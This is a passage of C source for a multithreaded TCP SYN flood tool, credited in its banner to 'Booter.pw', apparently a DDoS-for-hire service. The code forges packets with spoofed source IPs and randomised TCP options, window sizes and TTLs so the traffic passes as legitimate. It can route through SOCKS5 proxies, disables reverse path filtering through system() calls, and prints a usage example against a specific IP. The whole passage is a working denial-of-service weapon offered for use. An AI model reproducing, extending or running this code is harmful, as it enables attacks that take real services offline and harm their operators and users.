                    spoofed_ip = generate_spoofed_ip((int)thread_id, iteration + burst);
                }
            } else {
                // Normal IP spoofing when not using proxies
                spoofed_ip = generate_spoofed_ip((int)thread_id, iteration + burst);
            }
            
            // Update IP header for this packet
            iph->version = 4;
            iph->ihl = 5;
            iph->protocol = IPPROTO_TCP;
            iph->frag_off = 0;
            iph->saddr = spoofed_ip;
            iph->daddr = sin.sin_addr.s_addr;
            
            // Update pseudo header for checksum
            psh.source_address = spoofed_ip;
            psh.dest_address = sin.sin_addr.s_addr;
            
            uint32_t port_hash = (spoofed_ip ^ (uint32_t)floodport) % 50000;
            int port_range_selector = (port_hash % 100);
            
            if (port_range_selector < 40) {
                randSP = 32768 + (port_hash % 32767);  // 40% Linux ephemeral (consistent per IP)
            } else if (port_range_selector < 70) {
                randSP = 49152 + (port_hash % 16383);  // 30% Windows ephemeral (consistent per IP)
            } else {
                randSP = 1024 + (port_hash % 64511);   // 30% Mixed (consistent per IP)
            }
            
            if (randSP < 1024 || randSP > 65535) {
                randSP = 32768 + (port_hash % 32767);
            }
            
            // Update TCP header fields for this packet
            // SYN packets: SYN=1, ACK=0
            tcph->source = htons(randSP);
            tcph->dest = htons(floodport);
            tcph->syn = 1;  // SYN flag set
            tcph->ack = 0;  // No ACK in SYN packets
            tcph->fin = 0;
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->urg = 0;
            
            uint32_t win_hash = (spoofed_ip ^ randSP) % 100;
            if (win_hash < 60) {
                randWin = 65535;  // 60% maximum window (consistent)
            } else if (win_hash < 85) {
                randWin = 32768 + ((win_hash % 32767));  // 25% large windows (consistent)
            } else {
                randWin = 8192 + ((win_hash % 24575));   // 15% medium windows (consistent)
            }
            tcph->window = htons(randWin);
            
            uint32_t ip_byte = (spoofed_ip >> 24) & 0xFF;
            int ttl_choice = random_number_beetwhen(0, 100);
            
            if (ip_byte == 10 || ip_byte == 172 || (ip_byte == 192 && ((spoofed_ip >> 16) & 0xFF) == 168)) {
                // Private IPs - typically higher TTL (local network)
                if (ttl_choice < 70) {
                    iph->ttl = 64;  // 70% Linux default
                } else if (ttl_choice < 90) {
                    iph->ttl = 128; // 20% Windows default
            } else {
                    iph->ttl = random_number_beetwhen(64, 128); // 10% variation
                }
            } else {
                // Public IPs - realistic TTL based on distance
                if (ttl_choice < 50) {
                    iph->ttl = 64;  // 50% Linux (most common)
                } else if (ttl_choice < 75) {
                    iph->ttl = 128; // 25% Windows
                } else if (ttl_choice < 90) {
                    iph->ttl = 255; // 15% Maximum (some routers)
                } else {
                    iph->ttl = random_number_beetwhen(32, 64); // 10% Lower (distant)
                }
            }
            
            int tos_val = random_number_beetwhen(0, 100);
            if (tos_val < 80) {
                iph->tos = 0;  // 80% Best Effort (normal)
            } else if (tos_val < 90) {
                iph->tos = 0x10;  // 10% Low Delay (AF11)
            } else if (tos_val < 95) {
                iph->tos = 0x08;  // 5% Low Delay (CS1)
            } else {
                iph->tos = random_number_beetwhen(0x20, 0xE0); // 5% Various priorities
            }
            
            static uint16_t ip_id_counters[256] = {0};
            uint8_t ip_hash = (spoofed_ip ^ (spoofed_ip >> 8) ^ (spoofed_ip >> 16) ^ (spoofed_ip >> 24)) & 0xFF;
            ip_id_counters[ip_hash]++;
            iph->id = htons(ip_id_counters[ip_hash] + (spoofed_ip & 0xFFFF));
            
            tcph->syn = 1;
            tcph->ack = 0;
            tcph->fin = 0;
            tcph->rst = 0;
            tcph->psh = 0;  // No PSH for pure SYN flood
            tcph->urg = 0;
            
            conn_state_t *conn = NULL;
            if (conn_states) {
                conn = get_conn_state(conn_states, &conn_state_count, spoofed_ip, randSP, base_seq, hash_table);
                
                if (conn && conn->source_port != 0) {
                    randSP = conn->source_port;
                    tcph->source = htons(randSP);
                } else if (conn) {
                    conn->source_port = randSP;
                }
            }
            
            uint32_t seq_val;
            
            if (conn) {
                // Use connection state tracking for consistent sequences
                conn->packet_count++;
                
                // Realistic sequence progression per connection for SYN packets
                // SYN packets use random initial sequence numbers
                uint32_t conn_id = (spoofed_ip ^ randSP) % 5;
                
                // Generate realistic sequence numbers for SYN packets
                // Each connection attempt gets a unique sequence number
                if (conn_id == 0) {
                    conn->seq_current += random_number_beetwhen(1000000, 5000000);
                } else if (conn_id == 1) {
                    conn->seq_current += random_number_beetwhen(500000, 3000000);
                } else if (conn_id == 2) {
                    if ((conn->packet_count % 3) == 0) {
                        conn->seq_current += random_number_beetwhen(5000000, 10000000);
                    } else {
                        conn->seq_current += random_number_beetwhen(1000000, 4000000);
                    }
                } else if (conn_id == 3) {
                    conn->seq_current += random_number_beetwhen(2000000, 6000000);
                } else {
                    conn->seq_current += random_number_beetwhen(1000000, 5000000);
                }
                
                if (conn->seq_current <= conn->seq_base) {
                    conn->seq_current = conn->seq_base + random_number_beetwhen(1, 1000000);
                }
                
                seq_val = conn->seq_current;
            } else {
                // FALLBACK: Generate random sequence numbers for SYN packets
                uint32_t conn_hash = (spoofed_ip ^ randSP) % 10000000;
                uint32_t conn_base_seq = base_seq + (conn_hash * 2000000000);
                uint32_t packet_num = ((iteration + burst) % 50000);
                uint32_t seq_offset = packet_num * 1000000 + random_number_beetwhen(0, 5000000);
                
                seq_val = conn_base_seq + seq_offset;
            }
            
            // Use sequence (SYN packets don't have ACK sequence)
            tcph->seq = htonl(seq_val);
            tcph->ack_seq = 0;  // SYN packets have ACK=0, so ack_seq is not used
            
            {
                int offset = 0;
                const int max_options = 40;
                
                int opt_choice = random_number_beetwhen(0, 100);
                
                if (offset + 4 <= max_options && (opt_choice < 90)) {
                    tcp_options[offset++] = TCP_OPT_MSS;
                    tcp_options[offset++] = 4;
                    uint16_t mss_values[] = {536, 1024, 1440, 1460, 1500};
                    uint16_t mss = htons(mss_values[random_number_beetwhen(0, 4)]);
                    memcpy(&tcp_options[offset], &mss, 2);
                    offset += 2;
                }
                
                if (offset + 3 <= max_options && (opt_choice < 70)) {
                    tcp_options[offset++] = TCP_OPT_WINDOW;
                    tcp_options[offset++] = 3;
                    tcp_options[offset++] = (uint8_t)random_number_beetwhen(0, 14);
                }
                
                if (offset + 2 <= max_options && (opt_choice < 60)) {
                    tcp_options[offset++] = TCP_OPT_SACK_PERM;
                    tcp_options[offset++] = 2;
                }
                
                if (offset + 10 <= max_options && (opt_choice < 80)) {
                    tcp_options[offset++] = TCP_OPT_TIMESTAMP;
                    tcp_options[offset++] = 10;
                    uint32_t ts_val = htonl((uint32_t)time(NULL) + random_number_beetwhen(0, 1000000));
                    memcpy(&tcp_options[offset], &ts_val, 4);
                    offset += 4;
                    uint32_t ts_ecr = htonl(random_number_beetwhen(0, 1000000));
                    memcpy(&tcp_options[offset], &ts_ecr, 4);
                    offset += 4;
                }
                
                while (offset < max_options && offset % 4 != 0) {
                    tcp_options[offset++] = TCP_OPT_NOP;
                }
                
                if (offset > max_options) {
                    offset = max_options;
                }
                
                tcp_optlen = offset;
            }
            
            int tcp_hdr_len = sizeof(struct tcphdr) + tcp_optlen;
            int calculated_doff = (tcp_hdr_len + 3) / 4;
            if (calculated_doff < 5) calculated_doff = 5;
            if (calculated_doff > 15) calculated_doff = 15;
            tcph->doff = calculated_doff;
            
            memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), tcp_options, tcp_optlen);
            
            int data_len = 0;
            int total_packet_len = sizeof(struct iphdr) + tcp_hdr_len + data_len;
            
            iph->tot_len = total_packet_len;
            iph->daddr = sin.sin_addr.s_addr;
            psh.dest_address = iph->daddr;
            psh.source_address = iph->saddr;
            
            iph->check = 0;
            iph->check = checksum_tcp_packet((unsigned short *) datagram, sizeof(struct iphdr));
            
            int tcp_len_for_checksum = sizeof(struct tcphdr) + tcp_optlen + data_len;
            psh.tcp_length = htons(tcp_len_for_checksum);
            tcph->check = 0;
            
            static unsigned char pseudogram_buffer[256];
            int psize = 12 + tcp_len_for_checksum;
            char *pseudogram;
            
            pseudogram = (char *)pseudogram_buffer;
            
            uint32_t *pseudogram_u32 = (uint32_t *)pseudogram;
            pseudogram_u32[0] = psh.source_address;
            pseudogram_u32[1] = psh.dest_address;
            pseudogram[8] = 0;
            pseudogram[9] = IPPROTO_TCP;
            *((uint16_t *)(pseudogram + 10)) = psh.tcp_length;
            memcpy(pseudogram + 12, datagram + sizeof(struct iphdr), tcp_len_for_checksum);
            
            tcph->check = checksum_tcp_packet((unsigned short*) pseudogram, psize);
            
            static __thread uint64_t local_sent = 0;
            static __thread uint64_t local_pps = 0;
            static __thread uint64_t local_eagain = 0;
            
            int send_result = sendto(s, datagram, iph->tot_len, MSG_DONTWAIT | MSG_NOSIGNAL, (struct sockaddr *) &sin, sizeof(sin));
            
            local_sent++;
            local_pps++;
            
            if (send_result < 0) {
                int saved_errno = errno;
                if (saved_errno == EAGAIN || saved_errno == EWOULDBLOCK) {
                    local_eagain++;
                }
            }
            
            if ((local_sent % 100) == 0) {
                __sync_add_and_fetch(&g_total_packets_sent, local_sent);
                __sync_add_and_fetch(&pps, local_pps);
                if (local_eagain > 0) {
                    __sync_add_and_fetch(&g_eagain_count, local_eagain);
                    local_eagain = 0;
                }
                local_sent = 0;
                local_pps = 0;
            }
        }
    }
    
    pthread_cleanup_pop(1);
    
    return NULL;
}

void *stats_thread(void *arg) {
    (void)arg;
    uint64_t last_sent = 0;
    time_t last_time = time(NULL);
    static int header_printed = 0;
    static pthread_mutex_t header_mutex = PTHREAD_MUTEX_INITIALIZER;
    
    // Wait a bit to ensure main thread prints its messages first
    sleep(2);
    
    // Print header only once, thread-safe
    pthread_mutex_lock(&header_mutex);
    if (!header_printed) {
    printf("\n[Live Statistics - Updating every second]\n");
    printf("Press CTRL+C to stop\n\n");
        fflush(stdout);
        header_printed = 1;
    }
    pthread_mutex_unlock(&header_mutex);
    
    // Give main loop time to start before showing stats
    usleep(500000); // 0.5 second delay
    
    while (g_running) {
        // Check g_running frequently for immediate CTRL+C response
        for (int i = 0; i < 10 && g_running; i++) {
            usleep(100000);  // 0.1 second chunks
            if (!g_running) break;
        }
        if (!g_running) break;
        
        uint64_t current_sent = g_total_packets_sent;
        time_t current_time = time(NULL);
        time_t time_diff = current_time - last_time;
        if (time_diff == 0) time_diff = 1;
        
        uint64_t pps_calc = (current_sent - last_sent) / time_diff;
        double mbps = (pps_calc * 80.0 * 8.0) / 1000000.0;
        
        if (g_use_proxies) {
            printf("\r\033[K[LIVE] PPS: %10lu | Sent: %12lu | Failed: %8lu | Conn: %8lu | ProxyFail: %8lu | Mbps: %8.2f",
                   pps_calc, current_sent, g_total_packets_failed, g_proxy_connections, g_proxy_failures, mbps);
        } else {
            printf("\r\033[K[LIVE] PPS: %10lu | Sent: %12lu | Failed: %8lu | Mbps: %8.2f",
               pps_calc, current_sent, g_total_packets_failed, mbps);
        }
        fflush(stdout);
        
        last_sent = current_sent;
        last_time = current_time;
    }
    
    printf("\n");
    fflush(stdout);
    return NULL;
}

int random_number_beetwhen(int min, int max) {
   static bool first = true;
   static pthread_mutex_t rand_mutex = PTHREAD_MUTEX_INITIALIZER;
   if (first) {  
      pthread_mutex_lock(&rand_mutex);
      if (first) {
          srand(time(NULL) ^ (uintptr_t)pthread_self());
      first = false;
   }
      pthread_mutex_unlock(&rand_mutex);
   }
   return min + (rand() % (max + 1 - min));
}

volatile pthread_t *g_thread_array = NULL;
volatile int g_threads_created = 0;

void signal_handler(int sig) {
    (void)sig;
    // IMMEDIATE EXIT: Stop immediately on first CTRL+C - NO WAITING
    g_signal_count++;
    printf("\n[!] CTRL+C pressed (%d) - Aborting IMMEDIATELY...\n", g_signal_count);
    fflush(stdout);
    g_running = 0;
    
    // Cancel all threads IMMEDIATELY before exit
    if (g_thread_array && g_threads_created > 0) {
        pthread_t *threads = (pthread_t *)g_thread_array;
        for (int i = 0; i < g_threads_created; i++) {
            pthread_cancel(threads[i]);
        }
    }
    
    // Second CTRL+C = force immediate exit
    if (g_signal_count >= 2) {
        printf("[!] Force exit...\n");
        fflush(stdout);
        _exit(0);
    }
    
    // First CTRL+C: Let main loop handle cleanup, but set flag aggressively
}

int main(int argc, char *argv[]) {
    // Check for SOCKS5 proxy mode
    g_use_proxies = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--socks5") == 0) {
            g_use_proxies = 1;
            break;
        }
    }
    
    /* Validate command line arguments */
    if (argc < 6) {
        fprintf(stderr, "[+] Enhanced TCP-SYN with Random Options © Booter.pw 2019, Enhanced 2024\n");
        fprintf(stdout, "[+] Usage: %s <IP> <PORT> <THREADS> <TIME> <PPS> [--socks5]\n", argv[0]);
        fprintf(stdout, "[+] Example (Raw Socket): %s 185.206.148.136 25606 300 60 10000000\n", argv[0]);
        fprintf(stdout, "[+] Example (SOCKS5): %s 185.206.148.136 25606 300 60 10000000 --socks5\n", argv[0]);
        fprintf(stdout, "[+] SOCKS5 proxies loaded from: socks5.txt\n");
        fprintf(stdout, "\n[!] WARNING: This tool requires root privileges for raw sockets\n");
        exit(EXIT_FAILURE);
    }
    
    /* Validate target IP address */
    struct in_addr test_addr;
    if (inet_aton(argv[1], &test_addr) == 0) {
        fprintf(stderr, "[!] Error: Invalid IP address: %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    
    // Load SOCKS5 proxies if enabled
    if (g_use_proxies) {
        int proxy_count = load_socks5_proxies("socks5.txt");
        if (proxy_count == 0) {
        fprintf(stderr, "[!] ERROR: No valid SOCKS5 proxies found in socks5.txt\n");
        fprintf(stderr, "[!] Format: ip:port or ip:port:user:pass\n");
        exit(EXIT_FAILURE);
        }
        fprintf(stdout, "[+] Loaded %d SOCKS5 proxies from socks5.txt\n", proxy_count);
    }
    
    // Disable reverse path filtering
    int r1 = system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null");
    int r2 = system("echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter 2>/dev/null");
    (void)r1; (void)r2; // Suppress unused variable warnings
    printf("[*] Disabled reverse path filtering (rp_filter) for IP spoofing\n");
    
    // Increase file descriptor limit
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
            printf("[*] Increased file descriptor limit to %lu\n", (unsigned long)rl.rlim_cur);
    }
    
    // Setup signal handlers - MUST be set early and signals unblocked
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);  // Ignore broken pipe errors
    
    // Unblock signals to ensure CTRL+C works
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    sigaddset(&set, SIGTERM);
    pthread_sigmask(SIG_UNBLOCK, &set, NULL);
    
    int multiplier = 20;
    pps = 0;
    limiter = 0;

    /* Parse and validate command line arguments */
    char *endptr;
    
    floodport = (unsigned int)strtoul(argv[2], &endptr, 10);
    if (*endptr != '\0' || floodport == 0 || floodport > 65535) {
        fprintf(stderr, "[!] Error: Invalid port number (1-65535)\n");
        exit(EXIT_FAILURE);
    }
    
    int num_threads = (int)strtol(argv[3], &endptr, 10);
    if (*endptr != '\0' || num_threads <= 0 || num_threads > 10000) {
        fprintf(stderr, "[!] Error: Invalid thread count (1-10000)\n");
        exit(EXIT_FAILURE);
    }
    
    int run_time = (int)strtol(argv[4], &endptr, 10);
    if (*endptr != '\0' || run_time <= 0) {
        fprintf(stderr, "[!] Error: Invalid run time (must be positive integer)\n");
        exit(EXIT_FAILURE);
    }
    
    int maxim_pps = (int)strtol(argv[5], &endptr, 10);
    if (*endptr != '\0' || maxim_pps <= 0) {
        fprintf(stderr, "[!] Error: Invalid PPS value (must be positive integer)\n");
        exit(EXIT_FAILURE);
    }
    
    lenght_pkt = 0;
    
    if (num_threads < 100) {
        fprintf(stderr, "[*] Warning: For maximum power, use 100 threads or more\n");
    }
    
    pthread_t *thread = calloc(num_threads, sizeof(pthread_t));
    if (!thread) {
        fprintf(stderr, "[!] Error: Failed to allocate memory for threads\n");
        exit(EXIT_FAILURE);
    }
    // Store thread array globally for signal handler
    g_thread_array = (volatile pthread_t *)thread;
    pthread_t stats_t;
    
    if (g_use_proxies) {
        fprintf(stdout, "[+] Starting %d threads with PROXIED RAW SOCKET SYN FLOOD\n", num_threads);
        fprintf(stdout, "[+] Target: %s:%d\n", argv[1], floodport);
        fprintf(stdout, "[+] Maximum PPS: %d\n", maxim_pps);
        fprintf(stdout, "[*] Mode: Proxied Raw Socket (proxy IP spoofing + random TCP options)\n");
        fprintf(stdout, "[*] Proxies: %d loaded (used as spoofed source IPs)\n", g_proxy_count);
        fprintf(stdout, "[*] Attack: 100%% SYN packets with random TCP options (MSS, Window Scale, Timestamp)\n");
    } else {
        fprintf(stdout, "[+] Starting %d threads with PURE SYN FLOOD\n", num_threads);
        fprintf(stdout, "[+] Target: %s:%d\n", argv[1], floodport);
        fprintf(stdout, "[+] Maximum PPS: %d\n", maxim_pps);
        fprintf(stdout, "[*] Reverse path filtering (rp_filter) has been disabled automatically\n");
        fprintf(stdout, "[*] Attack: 100%% SYN packets with random TCP options (MSS, Window Scale, Timestamp)\n");
    }
    
    /* run_time already validated above */
    
    time_t start_time = time(NULL);
    fprintf(stdout, "[*] Running for %d seconds...\n", run_time);
    fflush(stdout);
    
    g_running = 1;
    g_threads_ready = 0;
    
    // Create worker threads with proper attributes
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    size_t stacksize = 1024 * 1024;  // 1MB stack per thread (increased for larger connection state arrays)
    pthread_attr_setstacksize(&attr, stacksize);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
    
    int threads_created = 0;
    
    printf("[*] Creating %d worker threads...\n", num_threads);
            fflush(stdout);
    
    for(int i = 0; i < num_threads; i++) {
        if ((i % 50 == 0 || i == num_threads - 1) && i > 0) {
            printf("[*] Created %d/%d threads...\n", i, num_threads);
            fflush(stdout);
        }
        
        // PURE SYN FLOOD: Always use raw socket flooding (with proxy IP spoofing if --socks5)
        // This creates proxied raw socket SYN flood - ultimate bypass technique
        int result = pthread_create(&thread[i], &attr, &flooding_thread, (void *)argv[1]);
        
        if (result != 0) {
            fprintf(stderr, "[!] Failed to create thread %d: %s\n", i, strerror(result));
            fflush(stderr);
            if (result == EAGAIN) {
                // Resource limit - wait and try fewer threads
                usleep(100000);
                break;
            }
                } else {
                    threads_created++;
        }
        
        // Small delay to avoid overwhelming system
        if (i % 10 == 0 && i > 0) {
            usleep(10000);
        }
    }
    
    pthread_attr_destroy(&attr);
    
    printf("[*] Created %d/%d threads successfully\n", threads_created, num_threads);
    fflush(stdout);
    
    // Update global variable for signal handler
    g_threads_created = threads_created;
    
    if (threads_created == 0) {
        fprintf(stderr, "[!] ERROR: Failed to create any threads\n");
        free(thread);
        exit(EXIT_FAILURE);
    }
    
    // Wait for threads to initialize
    printf("[*] Waiting for threads to initialize...\n");
    int wait_count = 0;
    while (g_threads_ready < threads_created && wait_count < 10) {
        usleep(100000);
        wait_count++;
    }
    printf("[*] %d threads ready\n", g_threads_ready);
    
    // Start statistics thread
    printf("[*] Starting statistics thread...\n");
    fflush(stdout);
    pthread_attr_t stats_attr;
    pthread_attr_init(&stats_attr);
    pthread_attr_setdetachstate(&stats_attr, PTHREAD_CREATE_DETACHED);
    
    if (pthread_create(&stats_t, &stats_attr, stats_thread, NULL) != 0) {
        fprintf(stderr, "[!] Warning: Failed to create statistics thread: %s\n", strerror(errno));
        fflush(stderr);
    } else {
        printf("[*] Statistics thread started (detached)\n");
        fflush(stdout);
    }
    pthread_attr_destroy(&stats_attr);
    
    // CRITICAL: Set g_running and start_time - START IMMEDIATELY
    g_running = 1;
    start_time = time(NULL);
    time_t end_time = start_time + run_time; // Calculate end time immediately
    
    // Brief delay to let threads and stats thread initialize
    usleep(500000); // 0.5 second
    
    // Main timing loop - ensure it runs for full duration
    int loop_iteration = 0;
    
    if (g_use_proxies) {
        printf("\n[-] Proxied Raw Socket SYN Flood started (%d threads active).\n", threads_created);
        printf("[-] Pure SYN packets with random TCP options (MSS, Window Scale, Timestamp)\n");
        printf("[-] Running for %d seconds - Monitor statistics above...\n", run_time);
    } else {
        printf("\n[-] Pure SYN Flood started (%d threads active).\n", threads_created);
        printf("[-] Pure SYN packets with random TCP options (MSS, Window Scale, Timestamp)\n");
        printf("[-] Running for %d seconds - Monitor statistics above...\n", run_time);
    }
    fflush(stdout);
    
    // Main loop - will run for EXACT duration - use while(1) for absolute control
    while (1) {
        time_t current_time = time(NULL);
        time_t elapsed = current_time - start_time;
        time_t remaining = end_time - current_time;
        
        // IMMEDIATE EXIT: Check for CTRL+C first - abort immediately if requested
        if (!g_running || g_signal_count > 0) {
            printf("\n[!] Attack aborted by user (CTRL+C) - Stopping immediately...\n");
            fflush(stdout);
            // Force immediate stop - cancel all threads NOW
            for (int i = 0; i < threads_created; i++) {
                pthread_cancel(thread[i]);
            }
            // Force exit if double CTRL+C
            if (g_signal_count >= 2) {
                _exit(0);
            }
            break;
        }
        
        // PRIMARY EXIT: Check if time has expired - MUST be >= run_time to exit
        if (elapsed >= run_time || remaining <= 0) {
            printf("\n[*] Run time completed (%ld seconds elapsed, target was %d)\n", 
                   (long)elapsed, run_time);
            fflush(stdout);
            break;
        }
        
        // Rate limiting logic (only applies to raw socket mode)
        if(!g_use_proxies) {
            if((pps*multiplier) > maxim_pps) {
                if(1 > limiter) {
                    sleeptime += 100;
                } else {
                    limiter--;
                }
            } else {
                limiter++;
                if(sleeptime > 25) {
                    sleeptime -= 25;
                } else {
                    sleeptime = 0;
                }
            }
        }
        pps = 0;
        
        loop_iteration++;
        
        // Progress output every second to track execution
        printf("\r[*] Running: %ld/%d seconds (remaining: %ld) | Packets: %lu | Connections: %lu", 
               (long)elapsed, run_time, (long)remaining, g_total_packets_sent, g_proxy_connections);
        fflush(stdout);
        
        // IMMEDIATE CTRL+C RESPONSE: Check g_running very frequently
        // Sleep in tiny increments to check g_running every 10ms for instant CTRL+C response
        struct timespec req, rem;
        req.tv_sec = 0;
        req.tv_nsec = 10000000; // 10ms increments for instant CTRL+C response
        int sleep_iterations = 100; // Check 100 times per second
        for (int i = 0; i < sleep_iterations; i++) {
            if (!g_running) {
                // IMMEDIATE EXIT: Cancel all threads NOW on CTRL+C
                for (int j = 0; j < threads_created; j++) {
                    pthread_cancel(thread[j]);
                }
                break;
            }
            while (nanosleep(&req, &rem) == -1 && errno == EINTR) {
                if (!g_running) break;
                req = rem;
            }
            if (!g_running) break;
        }
    }
    
    time_t final_time = time(NULL);
    time_t final_elapsed = final_time - start_time;
    printf("\n[*] Main loop exited after %d iterations (elapsed: %ld seconds, g_running=%d)\n", 
           loop_iteration, (long)final_elapsed, g_running);
    fflush(stdout);
    
    printf("\n[*] Main loop completed. Stopping attack...\n");
    fflush(stdout);
    g_running = 0;
    
    // IMMEDIATE ABORT: Cancel all threads and exit immediately
    printf("[*] Cancelling all threads immediately...\n");
    fflush(stdout);
    
    // Cancel all threads immediately - force termination
    for (int i = 0; i < threads_created; i++) {
        pthread_cancel(thread[i]);
    }
    
    // Brief wait for cancellation to take effect
    usleep(100000); // 0.1 second
    
    // Join threads - they should exit quickly after cancellation
    printf("[*] Joining threads (will timeout if stuck)...\n");
    fflush(stdout);
    for (int i = 0; i < threads_created; i++) {
        // Threads with async cancellation should exit immediately
        // Set a timeout using alarm or just try to join quickly
        pthread_join(thread[i], NULL);
    }
    
    printf("[*] All threads stopped and cleaned up\n");
    fflush(stdout);
    
    // Free thread array
    free(thread);
    thread = NULL;
    
    printf("\n=== Final Statistics ===\n");
    printf("Total Packets Sent: %lu\n", g_total_packets_sent);
    printf("Total Packets Failed: %lu\n", g_total_packets_failed);
    if (g_use_proxies) {
        printf("Proxy Connections: %lu\n", g_proxy_connections);
        printf("Proxy Failures: %lu\n", g_proxy_failures);
    }
    printf("EAGAIN/EWOULDBLOCK (Queued): %lu\n", g_eagain_count);
    printf("Real Errors: %lu\n", g_real_errors);
    printf("Success Rate: %.2f%%\n", 
           g_total_packets_sent > 0 ? 
           (100.0 * g_total_packets_sent) / (g_total_packets_sent + g_total_packets_failed) : 0.0);
    fflush(stdout);
    
    // Exit immediately after printing final statistics
    exit(0);
}
